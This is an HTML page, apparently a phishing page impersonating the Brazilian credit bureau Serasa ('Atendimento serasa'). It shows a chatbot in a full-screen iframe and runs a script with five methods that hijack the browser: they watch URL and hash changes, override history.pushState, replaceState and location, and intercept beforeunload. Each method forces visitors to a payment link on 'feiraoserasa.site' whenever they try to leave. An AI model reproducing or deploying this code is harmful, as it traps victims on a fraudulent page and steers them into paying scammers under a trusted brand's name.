<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Atendimento serasa</title>
<style>
  html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
  iframe { width:100vw; height:100vh; border:none; }
</style>
</head>
<body>

<iframe 
  id="typebot" 
  src="https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1"
></iframe>

<script>
const SEU_LINK = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
let jaRedirecionou = false;

// ===========================================
// M√âTODO 1: DETECTA MUDAN√áA NO HIST√ìRICO DO NAVEGADOR
// ===========================================
let ultimoURL = window.location.href;

const observarURL = () => {
  const urlAtual = window.location.href;
  
  // Se o URL do navegador mudou
  if (urlAtual !== ultimoURL && !jaRedirecionou) {
    console.log("üö® URL DO NAVEGADOR MUDOU!", ultimoURL, "->", urlAtual);
    
    // CANCELA a mudan√ßa voltando para o URL anterior
    history.replaceState(null, '', ultimoURL);
    
    // Redireciona para SEU link
    jaRedirecionou = true;
    window.location.href = SEU_LINK;
    return;
  }
  
  ultimoURL = urlAtual;
  requestAnimationFrame(observarURL);
};

// Inicia o observador
observarURL();

// ===========================================
// M√âTODO 2: INTERCEPTA BEFOREUNLOAD (quando vai sair)
// ===========================================
window.addEventListener('beforeunload', function(e) {
  if (!jaRedirecionou) {
    console.log("üö® NAVEGADOR TENTANDO SAIR DA P√ÅGINA!");
    
    // CANCELA a navega√ß√£o
    e.preventDefault();
    e.returnValue = '';
    
    // Redireciona para SEU link
    setTimeout(() => {
      jaRedirecionou = true;
      window.location.href = SEU_LINK;
    }, 10);
    
    return '';
  }
});

// ===========================================
// M√âTODO 3: BLOQUEIA MUDAN√áAS NO HISTORY
// ===========================================
const historyPushOriginal = history.pushState;
const historyReplaceOriginal = history.replaceState;

history.pushState = function(state, title, url) {
  console.log("üö® history.pushState tentado:", url);
  
  if (!jaRedirecionou && url && url !== window.location.href) {
    console.log("üìç Bloqueado! Redirecionando para seu link...");
    jaRedirecionou = true;
    window.location.href = SEU_LINK;
    return;
  }
  
  return historyPushOriginal.apply(this, arguments);
};

history.replaceState = function(state, title, url) {
  console.log("üö® history.replaceState tentado:", url);
  
  if (!jaRedirecionou && url && url !== window.location.href) {
    console.log("üìç Bloqueado! Redirecionando para seu link...");
    jaRedirecionou = true;
    window.location.href = SEU_LINK;
    return;
  }
  
  return historyReplaceOriginal.apply(this, arguments);
};

// ===========================================
// M√âTODO 4: MONITOR DE HASH (#) NA URL
// ===========================================
let ultimoHash = window.location.hash;

const observarHash = () => {
  if (window.location.hash !== ultimoHash && !jaRedirecionou) {
    console.log("üö® HASH mudou:", ultimoHash, "->", window.location.hash);
    jaRedirecionou = true;
    window.location.href = SEU_LINK;
    return;
  }
  ultimoHash = window.location.hash;
  setTimeout(observarHash, 100);
};

observarHash();

// ===========================================
// M√âTODO 5: BLOQUEADOR DE NAVEGA√á√ÉO VIA LOCATION
// ===========================================
Object.defineProperty(window, 'location', {
  set: function(value) {
    console.log("üö® Tentativa de mudar window.location:", value);
    
    if (!jaRedirecionou && value && value.href) {
      // CANCELA e redireciona para seu link
      jaRedirecionou = true;
      window.location.href = SEU_LINK;
      return;
    }
  },
  
  get: function() {
    return {
      href: window.location.href,
      replace: function(url) {
        console.log("üö® location.replace() chamado:", url);
        if (!jaRedirecionou) {
          jaRedirecionou = true;
          window.location.href = SEU_LINK;
        }
      },
      assign: function(url) {
        console.log("üö® location.assign() chamado:", url);
        if (!jaRedirecionou) {
          jaRedirecionou = true;
          window.location.href = SEU_LINK;
        }
      }
    };
  }
});

console.log("üõ°Ô∏è PROTETOR DE URL ATIVADO!");
console.log("üìå Monitorando qualquer mudan√ßa no URL do navegador...");
</script>
</body>
</html>